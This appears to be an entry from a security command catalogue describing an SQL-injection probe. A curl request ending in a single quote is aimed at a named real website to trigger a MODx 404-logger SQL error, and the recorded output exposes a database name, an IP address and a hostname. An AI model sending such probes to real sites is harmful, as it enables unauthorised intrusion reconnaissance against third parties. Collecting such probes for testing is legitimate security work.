---
id: cmd-uuid-1
data: >-
  curl -X GET "http://smarthistory.khanacademy.org/Campin/jeatest'" -H "Host:
  smarthistory.khanacademy.org" -H "Accept: */*" -H "Accept-Language: en" -H
  "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64;
  Trident/5.0)" --connect-timeout 10
tags:
  - sqli
  - recon
type: command
output: >-
  HTTP/1.1 404 Not Found ... SQL error: INSERT INTO
  `hzadofss_modx`.`error_404_logger` (url, ip, host, referer, createdon) VALUES
  ('/Campin/jeatest'','107.23.39.46',
  'ec2-107-23-39-46.compute-1.amazonaws.com', '', '2014-10-11 07:51:13')
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:47.400Z'
verified: false
validated: true
submitted: true
---
# test-sql-injection-with-single-quote-in-url

## Command

```bash
curl -X GET "http://smarthistory.khanacademy.org/Campin/jeatest'" -H "Host: smarthistory.khanacademy.org" -H "Accept: */*" -H "Accept-Language: en" -H "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)" --connect-timeout 10
```

## Description

Sends a GET request to a non-existent URL with a single quote in the path to trigger a SQL syntax error in the MODx 404 logging mechanism, confirming injection vulnerability.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Path | Non-existent URL path with trailing single quote (e.g., /Campin/jeatest') | Yes |
| Host | Target domain (e.g., smarthistory.khanacademy.org) | Yes |
| User-Agent | Browser-like header to mimic normal traffic | No |
| --connect-timeout | Timeout in seconds to handle slow responses | No |

## Examples

### Basic Usage

```bash
curl -X GET "http://target.com/nonexistent'" -H "Host: target.com"
```

### Advanced Usage

```bash
curl -X GET "http://smarthistory.khanacademy.org/Campin/jeatest'" -H "Host: smarthistory.khanacademy.org" -H "User-Agent: Mozilla/5.0 ..." --connect-timeout 10 -v
```

## Expected Output

A 404 response containing a MySQL syntax error exposing the INSERT query with the injected quote, such as VALUES ('/path'','IP', ...).

## Related

- [[Related Procedure: Trigger-SQL-Syntax-Error-in-404-Logging]]
